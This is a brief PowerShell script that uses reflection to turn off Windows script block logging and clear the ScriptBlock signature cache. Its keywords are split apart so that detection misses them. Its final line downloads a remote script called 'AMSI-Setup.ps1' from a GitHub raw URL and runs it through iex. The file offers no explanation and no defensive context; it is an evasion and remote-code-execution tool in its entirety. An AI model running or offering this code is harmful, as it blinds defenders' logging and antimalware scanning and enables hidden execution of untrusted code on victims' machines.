
Write-host " "
$polocy = [Ref].Assembly.GetType("System.Management.Automation.Utils")."GetFie`ld"("cachedGroupPolicySettings","NonPu"+"blic,Static")
if($polocy)
{
	$settings = $polocy.GetValue($null);
	if($settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'])
	{
		Write-host "Script block logging enabled"
		Write-host " "
		Write-host "Running script block logging bypass"

		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScr'+'iptBlockLogging',"0")
		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScri'+'ptBlockInvoca'+'tionLogging',"0")
		[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock")."GetFie`ld"("signatures","NonPub"+"lic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
	}
}

iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/AMSI-Setup.ps1'))
